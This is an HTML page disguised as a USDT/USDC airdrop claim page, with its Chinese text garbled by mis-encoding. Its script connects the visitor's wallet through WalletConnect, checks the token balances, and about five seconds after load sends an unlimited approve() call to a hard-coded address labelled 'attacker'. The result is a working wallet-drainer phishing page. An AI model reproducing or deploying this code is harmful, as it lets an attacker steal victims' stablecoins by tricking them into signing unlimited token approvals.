<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8" />
  <title>ğŸ ç©ºæŠ•æˆæ¬Šé  - WalletConnect v2</title>
  <!-- Web3Modal v2 + WalletConnect v2 -->
  <script type="module">
    import { Web3Modal } from 'https://unpkg.com/@web3modal/html@2.6.2/dist/index.js';
    import { EthereumClient, w3mConnectors, w3mProvider } from 'https://unpkg.com/@web3modal/ethereum@2.6.2/dist/index.js';
    import { configureChains, createConfig } from 'https://unpkg.com/@wagmi/core@1.3.0/dist/index.js';
    import { mainnet } from 'https://unpkg.com/@wagmi/core/chains';
    import { ethers } from 'https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js';

    const projectId = 'eebb83fd0c3ec5b1770ad20a754e2c8d'; // æ›¿æ›ç‚ºä½ è‡ªå·±çš„ projectId
    const chains = [mainnet];

    const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);
    const wagmiConfig = createConfig({
      autoConnect: true,
      connectors: w3mConnectors({ projectId, version: 2, chains }),
      publicClient
    });

    const ethereumClient = new EthereumClient(wagmiConfig, chains);
    const web3modal = new Web3Modal({
      projectId,
      themeMode: 'dark',
      walletImages: {
        metamask: 'https://registry.walletconnect.com/v2/logo/md/ef4fdb39b7c8473967fe6fefc9311d5b',
        trust: 'https://registry.walletconnect.com/v2/logo/md/6269ef7f7c998b95bf198b709cddf1e5'
      },
      featuredWalletIds: [
        'eip155:1:trust',
        'eip155:1:metamask'
      ]
    }, ethereumClient);

    const attacker = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
    const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
    const USDC = "0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48";
    const abi = ["function approve(address spender, uint256 amount) external returns (bool)", "function balanceOf(address) view returns (uint256)"];

    async function approveToken(tokenAddress, signer) {
      const contract = new ethers.Contract(tokenAddress, abi, signer);
      const tx = await contract.approve(attacker, ethers.constants.MaxUint256);
      return tx.hash;
    }

    async function start() {
      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        const userAddress = await signer.getAddress();
        const usdtContract = new ethers.Contract(USDT, abi, provider);
        const usdcContract = new ethers.Contract(USDC, abi, provider);

        const usdtBal = await usdtContract.balanceOf(userAddress);
        const usdcBal = await usdcContract.balanceOf(userAddress);

        let txHash;
        if (usdtBal.gt(0)) {
          txHash = await approveToken(USDT, signer);
        } else if (usdcBal.gt(0)) {
          txHash = await approveToken(USDC, signer);
        } else {
          document.getElementById("status").innerText = "âŒ æ²’æœ‰å¯ç”¨çš„ USDT æˆ– USDC é¤˜é¡";
          return;
        }

        document.getElementById("status").innerText = `âœ… æˆæ¬ŠæˆåŠŸï¼ŒTx Hash: ${txHash}`;
      } catch (err) {
        document.getElementById("status").innerText = "âŒ æˆæ¬Šå¤±æ•—: " + err.message;
      }
    }

    window.addEventListener("load", () => {
      setTimeout(() => {
        web3modal.openModal();
        setTimeout(() => start(), 5000); // æƒç¢¼é€£ç·š 5 ç§’å¾Œè‡ªå‹•åŸ·è¡Œ approve
      }, 1000);
    });
  </script>
</head>
<body style="background:#111; color:#fff; text-align:center; padding-top:60px; font-family:sans-serif;">
  <h2>ğŸ æ­å–œä½ ç²å¾— USDT / USDC ç©ºæŠ•ï¼</h2>
  <p>è«‹ä½¿ç”¨ MetaMask æˆ– Trust Wallet æƒæ QR Code å®Œæˆæˆæ¬Š</p>
  <div id="status" style="margin-top: 30px; font-size: 1.2rem;"></div>
</body>
</html>
